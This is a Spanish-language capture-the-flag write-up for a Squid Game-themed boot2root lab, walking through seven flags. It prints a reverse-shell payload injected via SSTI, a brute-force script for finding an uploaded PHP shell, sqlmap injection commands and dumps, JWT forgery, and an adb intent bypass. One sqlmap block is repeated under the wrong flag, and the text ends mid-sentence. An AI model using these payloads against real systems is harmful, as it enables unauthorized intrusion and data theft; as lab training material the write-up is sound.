![image_desc](USV_CTF_2025/img/CTF_USV_2025.jpg)

# CTF USV Suceava 2025 (ONIUCI Writeup)
#### Por Calana2 (a.k.a `s1s1fo`)

## Resumen

Este CTF emula una infraestructura con temática de la serie "Squid Game". 

- Categoría: Boot2Root
- Retos:
	- Flag 1 -- Server Side Template Injection (SSTi) 
	- Flag 2 -- Subida de archivos insegura
	- Flag 3 -- Less Significative Bit (LSB) Steganography + Falsificación de JSON Web Tokens (JWT)
	- Flag 4 -- Structured Query Language Injection (SQLi)
	- Flag 5 -- Port knocking
	- Flag 6 -- Intent Explotation
	- Flag 7 -- Cronjob inseguro + SUID Shared Library Injection

##  Enumeración (puertos y servicios expuestos)

- 22 (SSH)
- 25 (SMTP) (filtrado)
- 3000 (Node.Js Express)
- 3306 (MySQL 8.0.43)
- 8080 (Apache + PHP)
- 8081 (Apache + PHP)
- 8082 (Nginx)
---
## Flag 1 -- Server Side Template Injection (SSTi) 

![image_desc](USV_CTF_2025/img/2025-11-27-194551_1351x588_scrot 1.png)

Después de jugar "luz-roja luz verde" en el sitio web expuesto en el puerto 8080 nos dan una pista:

![image_desc](USV_CTF_2025/img/2025-11-27-194801_1348x600_scrot.png)

Esto sugiere STTI en uno de los campos del formulario que actualiza la información del jugador. PoC: `{{ 2+2 }}`
Sabemos que usa PHP asi que probamos con una carga útil para garantizarnos una reverse shell en <INSERTAR STTI\>:  `{{ system("/bin/bash -i >& /dev/tcp/<IP>/<PUERTO> 0>&1)" }}`

![image_desc](USV_CTF_2025/img/2025-11-27-194840_1346x477_scrot.png)

Una vez dentro revisamos el contenido de `/var/www/html/config.php` para obtener las credenciales de la base de datos y encontramos la primera bandera:

![image_desc](USV_CTF_2025/img/2025-11-27-195029_760x577_scrot.png)


## Flag 2 -- Subida de archivos insegura

![image_desc](USV_CTF_2025/img/2025-11-27-195117_1341x397_scrot.png)

A pesar del mensaje  "Forbidden" devuelto en la raíz del sitio web expuesto en el puerto 8081 la ruta `/login.php` es accesible. Podemos iniciar sesión en la base de datos MySQL expuesta en el puerto 3306 con las credenciales encontradas en el primer reto y volcar la tabla `admin users`:

![image_desc](USV_CTF_2025/img/2025-11-27-195241_977x599_scrot.png)

Las credenciales `front_man:red_light_green_light_456` son válidas para `/login.php`. Al iniciar sesión nos redirige a `/upload.php`:

![image_desc](USV_CTF_2025/img/2025-11-27-195319_1342x588_scrot.png)

Solo se permiten archivos con formato GIF, PNG, JPEG, PDF, etc. Sin embargo la lógica del programa solo valida la extensión. Podemos subir un archivo php malicioso que contenga una reverse shell bajo el nombre `file.png.php`:

![image_desc](USV_CTF_2025/img/2025-11-27-195412_1346x590_scrot.png)

Nos dan una pista de bajo que nombre se guarda el archivo en el servidor. Creamos un script para encontrar por fuerza bruta el posible archivo. Asumimos que la ruta es `/uploads/<file>` como ocurre usualmente:

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

base_url = "http://172.16.50.86:8081/uploads/"
c = {'PHPSESSID':'604c6ab6aebc917d445acc7ed1baf393'}

def check_filename(player, game_round, retries=3):
    player_str = str(player).zfill(3)
    filename = f"player{player_str}_game{game_round}_bbe43dab.php" # echo -n "monkey.png" | md5sum 
    url = base_url + filename

    for attempt in range(1, retries + 1):
        try:
            response = requests.get(url, timeout=3, cookies=c)
            if response.status_code == 200:
                print(f"[image_desc](USV_CTF_2025/img] Encontrado: {url}")
                exit(0)
            else:
                return f"[image_desc](USV_CTF_2025/img] {url} -> {response.status_code}"
        except requests.exceptions.RequestException as e:
            if attempt < retries:
                print(f"[image_desc](USV_CTF_2025/img] Error con {url}, reintentando ({attempt}/{retries})...")
            else:
                return f"[image_desc](USV_CTF_2025/img] Error persistente con {url}: {e}"

def main():
    tasks = [image_desc](USV_CTF_2025/img
    with ThreadPoolExecutor(max_workers=10) as executor:  # 10 hilos
        for player in range(1, 457):  # 001 a 456
            for game_round in range(1, 7):  # 1 a 6
                tasks.append(executor.submit(check_filename, player, game_round))

        for future in as_completed(tasks):
            print(future.result())

if __name__ == "__main__":
    main()
```

![image_desc](USV_CTF_2025/img/2025-11-27-205151_1337x530_scrot 1.png)

En `var/www/html/prize-only-for-the-worthy-62t1etlet7/prize.txt` encontramos la segunda flag y unas credenciales:

![image_desc](USV_CTF_2025/img/2025-11-27-205350_772x335_scrot.png)

## Flag 3 -- Less Significative Bit (LSB) Steganography + Falsificación de JSON Web Tokens (JWT)

![image_desc](USV_CTF_2025/img/2025-11-27-205445_1348x586_scrot.png)

En el sitio web expuesto en el puerto 8082 encontramos un `/robots.txt`:

![image_desc](USV_CTF_2025/img/2025-11-27-205459_1346x630_scrot.png)

Ambas rutas nos redirigen a `/login`. Con las credenciales encontradas en el reto anterior podemos iniciar sesión:

![image_desc](USV_CTF_2025/img/2025-11-27-205520_1345x618_scrot.png)

Tenemos acceso a `/status` pero no a `/organs`:

![image_desc](USV_CTF_2025/img/2025-11-27-205614_1341x630_scrot.png)
![image_desc](USV_CTF_2025/img/2025-11-27-205634_1347x632_scrot.png)

Si vemos las peticiones que se hacen al sitio con `curl` nos damos cuenta de que usa `React` o algun framework de Javascript como front-end. `React` renderiza completamente el sitio desde el Javascript. Si descargamos el archivo `main.js` tenemos acceso al código fuente del cliente. Si filtramos por los comentarios en HTML encontramos una pista:

```javascript
dangerouslySetInnerHTML: {
	__html: "\x3c!--Hint: The real game is in the dead bodies. Look closely. --\x3e"
}
```


Sugiere que hay algo oculto en la imagen `/api/images/dead_body.png`. Si revisamos mensajes ocultos usando los bits menos significativos con `zsteg` podemos observar lo siguiente:

```
zsteg dead.png
imagedata           .. text: "#-*:::.(,"
b1,rgb,lsb,xy       .. text: "55:worker secret:dead_people_remember_more_than_alive_ones"
b1,bgr,lsb,xy       .. file: OpenPGP Secret Key
b2,b,msb,xy         .. file: OpenPGP Public Key
b4,r,lsb,xy         .. text: "uB$2#4Cgxw"
b4,r,msb,xy         .. text: [image_desc](USV_CTF_2025/img3" repeated 19 times]
b4,g,lsb,xy         .. text: "3R5Wwxud"
b4,b,lsb,xy         .. text: "22\"3U2\"#3UD!"
```

De `main.js` podemos observar que la aplicación usa JWT para autenticación. Como vimos al intentar acceder a `/organs` anteriormente esta página es "solo para el rol worker".

Revisamos el JWT que tenemos:

![image_desc](USV_CTF_2025/img/2025-11-27-213410_1366x768_scrot 1.png)

Modificamos el campo `role` para convertirnos en un trabajador y firmamos el JWT con el secreto encontrado:

![image_desc](USV_CTF_2025/img/2025-11-27-213311_1366x768_scrot.png)

Ahora podemos acceder a `/organs` para obtener la tercera flag:

![image_desc](USV_CTF_2025/img/2025-11-27-213420_1366x768_scrot 1.png)

## Flag 4 -- Structured Query Language Injection (SQLi)

El campo de la barra de búsqueda (name) es inyectable:

![image_desc](USV_CTF_2025/img/2025-11-28-193220_672x336_scrot.png)

Con `sqlmap` podemos ver la base de datos `organsdb`:

```
sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoid29ya2VyIiwic3ViIjoicGxheWVyNDU2IiwiaWF0IjoxNzY0Mjk2MzI1LCJleHAiOjE3NjQyOTk5MjV9.DejOZ8Gj3EwAizlS2avMbPch3QHwhkXJkHR6tvddfIs" --dbs -v 0  
        ___
       __H__
 ___ ___[image_desc](USV_CTF_2025/img]_____ ___ ___  {1.8.11#stable}
|_ -| . [image_desc](USV_CTF_2025/img]     | .'| . |
|___|_  [image_desc](USV_CTF_2025/img]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[image_desc](USV_CTF_2025/img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[image_desc](USV_CTF_2025/img] starting @ 21:42:11 /2025-11-27/

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=a' AND 7974=7974 AND 'VNOj'='VNOj

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=a' AND (SELECT 2538 FROM (SELECT(SLEEP(5)))ctKg) AND 'SGng'='SGng

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: name=a' UNION ALL SELECT NULL,CONCAT(0x71766a7171,0x4f78456b715463764f6752596954544d767246596b6b45726679505a634a5064447266776b454545,0x71766a7171),NULL-- -
---
web application technology: Nginx 1.28.0
back-end DBMS: MySQL 8
available databases [image_desc](USV_CTF_2025/img]:
[image_desc](USV_CTF_2025/img] information_schema
[image_desc](USV_CTF_2025/img] mysql
[image_desc](USV_CTF_2025/img] organsdb
[image_desc](USV_CTF_2025/img] performance_schema
[image_desc](USV_CTF_2025/img] sys


[image_desc](USV_CTF_2025/img] ending @ 21:42:13 /2025-11-27/

```

Con las tablas `messages`,`organs` y `users`:

```
$ sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoid29ya2VyIiwic3ViIjoicGxheWVyNDU2IiwiaWF0IjoxNzY0Mjk2MzI1LCJleHAiOjE3NjQyOTk5MjV9.DejOZ8Gj3EwAizlS2avMbPch3QHwhkXJkHR6tvddfIs" -D organsdb
--tables -v 0
        ___
       __H__
 ___ ___[image_desc](USV_CTF_2025/img]_____ ___ ___  {1.8.11#stable}
|_ -| . [image_desc](USV_CTF_2025/img]     | .'| . |
|___|_  [image_desc](USV_CTF_2025/img]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[image_desc](USV_CTF_2025/img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[image_desc](USV_CTF_2025/img] starting @ 21:42:57 /2025-11-27/

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=a' AND 7974=7974 AND 'VNOj'='VNOj

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=a' AND (SELECT 2538 FROM (SELECT(SLEEP(5)))ctKg) AND 'SGng'='SGng

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: name=a' UNION ALL SELECT NULL,CONCAT(0x71766a7171,0x4f78456b715463764f6752596954544d767246596b6b45726679505a634a5064447266776b454545,0x71766a7171),NULL-- -
---
web application technology: Nginx 1.28.0
back-end DBMS: MySQL 8
Database: organsdb
[image_desc](USV_CTF_2025/img tables]
+----------+
| messages |
| organs   |
| users    |
+----------+


[image_desc](USV_CTF_2025/img] ending @ 21:42:59 /2025-11-27/
```

Luego con `sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoid29ya2VyIiwic3ViIjoicGxheWVyNDU2IiwiaWF0IjoxNzY0Mjk2MzI1LCJleHAiOjE3NjQyOTk5MjV9.DejOZ8Gj3EwAizlS2avMbPch3QHwhkXJkHR6tvddfIs" -D organsdb -T messages --columns` identificamos las columnas `hint` y `flag`. Volcamos la quinta flag:

```
 sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoid29ya2VyIiwic3ViIjoicGxheWVyNDU2IiwiaWF0IjoxNzY0Mjk2MzI1LCJleHAiOjE3NjQyOTk5MjV9.DejOZ8Gj3EwAizlS2avMbPch3QHwhkXJkHR6tvddfIs" -D organsdb -T messages -C flag --dump
        ___
       __H__
 ___ ___[image_desc](USV_CTF_2025/img]_____ ___ ___  {1.8.11#stable}
|_ -| . [image_desc](USV_CTF_2025/img]     | .'| . |
|___|_  [image_desc](USV_CTF_2025/img]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[image_desc](USV_CTF_2025/img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[image_desc](USV_CTF_2025/img] starting @ 21:46:39 /2025-11-27/

[image_desc](USV_CTF_2025/img1:46:39] [image_desc](USV_CTF_2025/imgNFO] resuming back-end DBMS 'mysql'
[image_desc](USV_CTF_2025/img1:46:39] [image_desc](USV_CTF_2025/imgNFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=a' AND 7974=7974 AND 'VNOj'='VNOj

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=a' AND (SELECT 2538 FROM (SELECT(SLEEP(5)))ctKg) AND 'SGng'='SGng

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: name=a' UNION ALL SELECT NULL,CONCAT(0x71766a7171,0x4f78456b715463764f6752596954544d767246596b6b45726679505a634a5064447266776b454545,0x71766a7171),NULL-- -
---
[image_desc](USV_CTF_2025/img1:46:41] [image_desc](USV_CTF_2025/imgNFO] the back-end DBMS is MySQL
web application technology: Nginx 1.28.0
back-end DBMS: MySQL 8
[image_desc](USV_CTF_2025/img1:46:41] [image_desc](USV_CTF_2025/imgNFO] fetching entries of column(s) 'flag' for table 'messages' in database 'organsdb'
Database: organsdb
Table: messages
[image_desc](USV_CTF_2025/img entry]
+----------------------------------------+
| flag                                   |
+----------------------------------------+
| flag{0rg4n$_f0r_$4l3_$qu1d_g4m3_5tyl3} |
+----------------------------------------+

[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgNFO] table 'organsdb.messages' dumped to CSV file '/home/kalcast/.local/share/sqlmap/output/172.16.50.86/dump/organsdb/messages.csv'
[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgARNING] HTTP error codes detected during run:
400 (Bad Request) - 2 times
[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgNFO] fetched data logged to text files under '/home/kalcast/.local/share/sqlmap/output/172.16.50.86'
[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgARNING] your sqlmap version is outdated

[image_desc](USV_CTF_2025/img] ending @ 21:46:44 /2025-11-27/
```

## Flag 5 -- Port knocking

Volcamos la columna `hint` de la tabla `messages`:
```
 sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoid29ya2VyIiwic3ViIjoicGxheWVyNDU2IiwiaWF0IjoxNzY0Mjk2MzI1LCJleHAiOjE3NjQyOTk5MjV9.DejOZ8Gj3EwAizlS2avMbPch3QHwhkXJkHR6tvddfIs" -D organsdb -T messages -C flag --dump
        ___
       __H__
 ___ ___[image_desc](USV_CTF_2025/img]_____ ___ ___  {1.8.11#stable}
|_ -| . [image_desc](USV_CTF_2025/img]     | .'| . |
|___|_  [image_desc](USV_CTF_2025/img]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[image_desc](USV_CTF_2025/img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[image_desc](USV_CTF_2025/img] starting @ 21:46:39 /2025-11-27/

[image_desc](USV_CTF_2025/img1:46:39] [image_desc](USV_CTF_2025/imgNFO] resuming back-end DBMS 'mysql'
[image_desc](USV_CTF_2025/img1:46:39] [image_desc](USV_CTF_2025/imgNFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=a' AND 7974=7974 AND 'VNOj'='VNOj

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=a' AND (SELECT 2538 FROM (SELECT(SLEEP(5)))ctKg) AND 'SGng'='SGng

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: name=a' UNION ALL SELECT NULL,CONCAT(0x71766a7171,0x4f78456b715463764f6752596954544d767246596b6b45726679505a634a5064447266776b454545,0x71766a7171),NULL-- -
---
[image_desc](USV_CTF_2025/img1:46:41] [image_desc](USV_CTF_2025/imgNFO] the back-end DBMS is MySQL
web application technology: Nginx 1.28.0
back-end DBMS: MySQL 8
[image_desc](USV_CTF_2025/img1:46:41] [image_desc](USV_CTF_2025/imgNFO] fetching entries of column(s) 'flag' for table 'messages' in database 'organsdb'
Database: organsdb
Table: messages
[image_desc](USV_CTF_2025/img entry]
+----------------------------------------+
| flag                                   |
+----------------------------------------+
| flag{0rg4n$_f0r_$4l3_$qu1d_g4m3_5tyl3} |
+----------------------------------------+

[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgNFO] table 'organsdb.messages' dumped to CSV file '/home/kalcast/.local/share/sqlmap/output/172.16.50.86/dump/organsdb/messages.csv'
[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgARNING] HTTP error codes detected during run:
400 (Bad Request) - 2 times
[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgNFO] fetched data logged to text files under '/home/kalcast/.local/share/sqlmap/output/172.16.50.86'
[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgARNING] your sqlmap version is outdated

[image_desc](USV_CTF_2025/img] ending @ 21:46:44 /2025-11-27/
```

Este contiene un mensaje enorme codificado en base64. Lo decodificamos:

![image_desc](USV_CTF_2025/img/2025-11-27-215159_937x151_scrot.png)
![image_desc](USV_CTF_2025/img/2025-11-27-215142_640x254_scrot.png)

Es una imagen jpeg al parecer. Eliminamos los primeros tres bytes para convertirlo en una imagen válida:

```
dd if=hint of=hint.jpg ibs=1 skip=3;file hint.jpg
437312+0 records in
854+1 records out
437312 bytes (437 kB, 427 KiB) copied, 0,400984 s, 1,1 MB/s
hint.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 1024x1536, components 3
```

![image_desc](USV_CTF_2025/img/image.jpg)


La pista hace referencia al *port knocking*, un método para abrir puertos externamente generando intentos de conexión a un conjunto de puertos cerrados en un orden específico. Enviamos un paquete TCP SYN a los puertos 456, 218 y 67 respectivamente. Mágicamente el servidor SMTP en el puerto 25 ahora acepta conexiones. Ejecutamos el comando MESSAGE y obtenemos la quinta flag:

![image_desc](USV_CTF_2025/img/2025-11-27-215327_1151x608_scrot.png)

## Flag 6 -- Intent Explotation

Si probamos el comando *HISTORY* nos informa de la URL para descargar una APK. Hacemos port knocking nuevamente y descargamos el archivo:

![image_desc](USV_CTF_2025/img/2025-11-27-215504_1190x623_scrot.png)

![image_desc](USV_CTF_2025/img/2025-11-27-220403_1300x480_scrot.png)

Extraemos la APK con `apktools`:
```
 mkdir VIPS; cd VIPS; apktool d ../VIPs.apk
I: Using Apktool 2.7.0-dirty on VIPs.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/kalcast/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Baksmaling classes2.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services director
```

Instalamos la APK y especificamos como host nuestra máquina vulnerable. 
La aplicación cuenta con un menú de desarrollador al cual no tenemos acceso:

![image_desc](USV_CTF_2025/img/Screenshot_20251129-095545_VIPs.jpg)

```
grep -iRnE "secret"
grep: VIPs/lib/x86_64/libctfnative.so: coincidencia en fichero binario
grep: VIPs/lib/armeabi-v7a/libctfnative.so: coincidencia en fichero binario
grep: VIPs/lib/arm64-v8a/libctfnative.so: coincidencia en fichero binario
grep: VIPs/lib/x86/libctfnative.so: coincidencia en fichero binario
VIPs/smali_classes2/com/squidgame/vips/DevMenuActivity.smali:30:        "nativeSecret",
VIPs/smali_classes2/com/squidgame/vips/DevMenuActivity.smali:32:        "getSecretFromNative",
VIPs/smali_classes2/com/squidgame/vips/DevMenuActivity.smali:37:        "getRequiredSecret",
VIPs/smali_classes2/com/squidgame/vips/DevMenuActivity.smali:63:.field private nativeSecret:Ljava/lang/String;
VIPs/smali_classes2/com/squidgame/vips/DevMenuActivity.smali:109:    iput-object v0, p0, Lcom/squidgame/vips/DevMenuActivity;->nativeSecret:Ljava/lang/String;
VIPs/smali_classes2/com/squidgame/vips/DevMenuActivity.smali:179:    iget-object v6, p0, Lcom/squidgame/vips/DevMenuActivity;->nativeSecret:Ljava/lang/String;
VIPs/smali_classes2/com/squidgame/vips/DevMenuActivity.smali:196:    iget-object v1, p0, Lcom/squidgame/vips/DevMenuActivity;->nativeSecret:Ljava/lang/String;
VIPs/smali_classes2/com/squidgame/vips/DevMenuActivity.smali:426:.method public final getRequiredSecret()Ljava/lang/String;
VIPs/smali_classes2/com/squidgame/vips/DevMenuActivity.smali:460:.method public final native getSecretFromNative()Ljava/lang/String;
VIPs/smali_classes2/com/squidgame/vips/DevMenuActivity.smali:474:    const-string v0, "decrypted_secret"
VIPs/smali_classes2/com/squidgame/vips/DevMenuActivity.smali:481:    invoke-virtual {p0}, Lcom/squidgame/vips/DevMenuActivity;->getRequiredSecret()Ljava/lang/String;
VIPs/smali_classes2/com/squidgame/vips/DevMenuActivity.smali:515:    invoke-virtual {p0}, Lcom/squidgame/vips/DevMenuActivity;->getSecretFromNative()Ljava/lang/String;
VIPs/smali_classes2/com/squidgame/vips/DevMenuActivity.smali:519:    iput-object p1, p0, Lcom/squidgame/vips/DevMenuActivity;->nativeSecret:Ljava/lang/String;
```

Analizamos `DevMenuActivity.smali` por su actividad sospechosa. Pasamos el código smali a un decompilador y encontramos lo siguiente:
```java
    public final String getRequiredSecret() {
        byte[image_desc](USV_CTF_2025/img decode = Base64.decode("c2ViYWdfem5hX2ZycGVyZ19ucHByZmZfeHJs", 2);
        Intrinsics.checkNotNull(decode);
        Charset charset = StandardCharsets.UTF_8;
        Intrinsics.checkNotNullExpressionValue(charset, "UTF_8");
        return decodeStr(new String(decode, charset));
    }
//............................
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (!Intrinsics.areEqual(getIntent().getStringExtra("decrypted_secret"), getRequiredSecret())) {
            Toast.makeText((Context) this, "Access denied", 0).show();
            finish();
            return;
        }
```

```
grep -RiE "Not yet implemented"
smali_classes2/com/squidgame/vips/ui/settings/SettingsFragment.smali:    const-string p1, "Not yet implemented"
```

```java
/* JADX INFO: Access modifiers changed from: private */
    public static final void onCreateView$lambda$1(SettingsFragment settingsFragment, View view) {
        Intrinsics.checkNotNullParameter(settingsFragment, "this$0");
        if (settingsFragment.isDeviceRooted()) {
            Toast.makeText(settingsFragment.requireContext(), "Operation not permitted on rooted device", 0).show();
        } else {
            Toast.makeText(settingsFragment.requireContext(), "Not yet implemented", 0).show();
        }
    }
```

El desarrollador nunca implementó la funcionalidad del botón. Sin embargo, podemos usar `adb` para llamar directamente a `DevMenuActivity` con un Intent que contenga la clave:valor `decrypted_secret:"front_man_secret_access_key"` para acceder al menú de desarrollador.

```
adb shell am start -n com.squidgame.vips/.DevMenuActivity \
  --es decrypted_secret "front_man_secret_access_key"
```

![image_desc](USV_CTF_2025/img/Screenshot_20251129-095232_VIPs.jpg)

Al pulsar el botón *Check Vips* podemos obtener usuarios y contraseñas, incluyendo la sexta flag:

![image_desc](USV_CTF_2025/img/photo_2025-11-28_22-06-24.jpg)
## Flag 7 -- Cronjob inseguro + SUID Shared Library Injection

Con las credenciales `jack:UsbNQ3%dca98#SqD` podemos conectarnos vía SSH al servidor.

En `/etc/cronjob` encontramos una tarea programada que ejecuta `/bin/update-lib.sh` cada 2 minutos. Buscando por binarios SUID encontramos un binario con SUID root `/usr/bin/squid`:

![image_desc](USV_CTF_2025/img/2025-11-27-220717_1366x768_scrot.png)

Identificamos que está empaquetado con UPX usando `strings squid | grep UPX` y lo desempaquetamos con `upx -d squid`

```
 ./squid
Usage: ./squid <key>
```

Analizando el binario con permisos SUID en Ghidra vemos que contiene la cadena "This_Is_Not_The_Flag_its_The_Decoded_Key". Además contiene codificada la librería `libsquid.so`y la cadena `run_helper` en base64.  Si introducimos la clave correcta el programa carga `libsquid.so` con `dlopen`, busca el símbolo `run_helper` con `dlsym` y lo invoca:

```C
  plaintext_pass = "This_Is_Not_The_Flag_its_The_Deco ded_Key";
  lib = "bGlic3F1aWQuc28=";
  run_helper = "cnVuX2hlbHBlcg==";
```

```C
    iVar1 = strcmp(_plaintext_pass,input);
    if (iVar1 == 0) {
      _argv[image_desc](USV_CTF_2025/imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b10;
      lVar2 = dlopen(&lib_name,1);
      local_68 = lVar2;
      if (lVar2 == 0) {
        _argv[image_desc](USV_CTF_2025/imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b3e;
        fwrite("Failed to load lib:",1,0x13,stderr);
      }
      else {
        _argv[image_desc](USV_CTF_2025/imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b5b;
        run_helper_address = (code *)dlsym(lVar2,&local _f8);
        local_70 = run_helper_address;
        if (run_helper_address != (code *)0x0) {
          _argv[image_desc](USV_CTF_2025/imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b9b;
          (*run_helper_address)();
          return 0;
        }
```

Para validar la clave hace: `transform(base64_decode(input)) == "This_Is_Not_The_Flag_its_The_Decoded_Key"`:

```C
num_Bytes_3 = base64_decode(orig,&decoded_input,100);
//.....
transform(&decoded_input,_argv + 1 + num_blocks * -2 + num_blocks2 * -2)
```

```C

void transform(char *expected_str,long addr)

{
  undefined uVar1;
  byte bVar2;
  size_t len_expected;
  ulong blocks;
  ulong num_16_byte_blocks;
  ulong num_16_bytes_block_;
  undefined8 uStack_80;
  long __param2;
  char *_expected_str;
  undefined local_61;
  undefined *local_60;
  long local_58;
  undefined *some_address;
  long local_48;
  undefined *local_40;
  long __long_expected_int;
  int __len_expected_int;
  int j;
  int k;
  int local_20;
  int i;
  char *__expected_str;
  undefined *addr_;
  int another_len;
  
  uStack_80 = 0x101431;
  __param2 = addr;
  _expected_str = expected_str;
  len_expected = strlen(expected_str);
  __expected_str = _expected_str;
  __len_expected_int = (int)len_expected;
  __long_expected_int = (long)__len_expected_int + -1;
  blocks = ((long)__len_expected_int + 15U) / 16;
  local_40 = (undefined *)(&__param2 + blocks * -2);
  for (i = 0; i < __len_expected_int; i = i + 1) {
    *(char *)((long)&__param2 + (long)i + blocks * -0x1 0) = _expected_str[image_desc](USV_CTF_2025/img];
  }
  local_48 = (long)__len_expected_int + -1;
  num_16_byte_blocks = ((long)__len_expected_int + 0xf U) / 0x10;
  some_address = (undefined *)(&__param2 + blocks *  -2 + num_16_byte_blocks * -2);
  local_58 = (long)__len_expected_int + -1;
  num_16_bytes_block_ = ((long)__len_expected_int + 0 xfU) / 0x10;
  local_60 = (undefined *)
             (&__param2 + blocks * -2 + num_16_byte_block s * -2 + num_16_bytes_block_ * -2);
  (&uStack_80)[image_desc](USV_CTF_2025/imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101522;
  fun1(__expected_str,&__param2 + blocks * -2 + num_ 16_byte_blocks * -2,len_expected & 0xffffffff);
  another_len = __len_expected_int;
  addr_ = some_address;
  (&uStack_80)[image_desc](USV_CTF_2025/imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101533;
  fun2(addr_,another_len);
  another_len = __len_expected_int;
  addr_ = some_address;
  (&uStack_80)[image_desc](USV_CTF_2025/imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101544;
  another_len = fun3(addr_,another_len);
  if (another_len != 42) {
    for (local_20 = 0; local_20 < 44; local_20 = local_20 + 1) {
      for (k = 0; k < __len_expected_int; k = k + 1) {
        uVar1 = local_40[image_desc](USV_CTF_2025/img];
        another_len = k % 8;
        local_61 = uVar1;
        (&uStack_80)[image_desc](USV_CTF_2025/imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101592;
        bVar2 = fun4(uVar1,another_len);
        local_40[image_desc](USV_CTF_2025/img] = bVar2 ^ 0x4f;
      }
    }
    for (j = 0; j < __len_expected_int; j = j + 1) {
      *(undefined *)(__param2 + j) = local_40[image_desc](USV_CTF_2025/img];
    }
  }
  return;
}
```

```C
void fun1(long expected_str,long input,int len)

{
  undefined4 i;
  
  for (i = 0; i < len; i = i + 1) {
    *(byte *)(input + i) = *(char *)(expected_str + i) * '\r'  ^ 0xaa;
  }
  return;
}

void fun2(long input,int len)

{
  int i;
  uint local_c;
  
  local_c = 0;
  for (i = 0; i < len; i = i + 1) {
    local_c = local_c ^ i * 0x11 + (int)*(char *)(input + i) & 0xffU;
    local_c = (int)local_c >> 5 | local_c * 8;
  }
  if ((local_c & 0xf0) == 0xa0) {
    puts("Hash matched.");
  }
  return;
}

undefined4 fun3(undefined8 param_1,int param_2)

{
  undefined4 i;
  
  for (i = 0; i < param_2; i = i + 1) {
  }
  return 69;
}
uint fun4(byte b,byte mod)

{
  return (int)(uint)b >> (8 - mod & 0x1f) | (uint)b << (m od & 0x1f);
}
```

Hay varios puntos a tener en cuenta:
